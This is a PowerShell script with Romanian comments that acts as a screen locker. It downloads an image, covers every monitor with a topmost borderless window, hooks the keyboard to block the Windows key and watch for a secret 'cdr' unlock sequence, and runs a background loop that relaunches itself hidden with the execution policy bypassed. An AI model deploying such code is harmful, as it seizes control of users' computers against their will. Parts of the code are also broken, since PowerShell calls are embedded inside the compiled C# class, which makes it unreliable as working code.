# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Blocarea tastei Windows și ascultarea tastelor pentru `cdr`
function Block-WindowsKey-And-DetectCDR {
    Add-Type @"
        using System;
        using System.Text;
        using System.Runtime.InteropServices;
        public class InterceptKeys {
            public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UnhookWindowsHookEx(IntPtr hhk);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            public const int WH_KEYBOARD_LL = 13;
            public const int WM_KEYDOWN = 0x0100;
            public static StringBuilder KeyBuffer = new StringBuilder();
            public static IntPtr HookID = IntPtr.Zero;
            public static LowLevelKeyboardProc Proc = HookCallback;

            public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (vkCode == 0x5B || vkCode == 0x5C) { // Windows Key
                        return (IntPtr)1; // Blochează tasta Windows
                    }

                    // Detectează secvența "cdr"
                    char keyChar = Convert.ToChar(vkCode);
                    KeyBuffer.Append(keyChar.ToString().ToLower());
                    if (KeyBuffer.ToString().Contains("cdr")) {
                        [InterceptKeys]::RemoveHook();
                        Stop-All();
                    }

                    // Menține buffer-ul la 3 caractere
                    if (KeyBuffer.Length > 3) {
                        KeyBuffer.Remove(0, KeyBuffer.Length - 3);
                    }
                }
                return CallNextHookEx(HookID, nCode, wParam, lParam);
            }

            public static void SetHook() {
                HookID = SetWindowsHookEx(WH_KEYBOARD_LL, Proc, GetModuleHandle(null), 0);
            }
            public static void RemoveHook() {
                UnhookWindowsHookEx(HookID);
            }
        }
"@
    [InterceptKeys]::SetHook()
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $forms += $form
    }

    # Rulează formularele pe toate monitoarele
    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației
function Stop-All {
    Write-Host "Aplicația a fost oprită prin codul secret 'cdr'." -ForegroundColor Green
    [InterceptKeys]::RemoveHook()
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Funcție de monitorizare pentru repornire automată
function Monitor-Image {
    $scriptPath = $MyInvocation.MyCommand.Definition

    while ($true) {
        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
        if (-not $processes) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        }
        Start-Sleep -Seconds 2
    }
}

# Pornire aplicație principală și monitorizare
Download-Image
Block-WindowsKey-And-DetectCDR
Start-Job -ScriptBlock { Monitor-Image }
Show-FullScreenImage
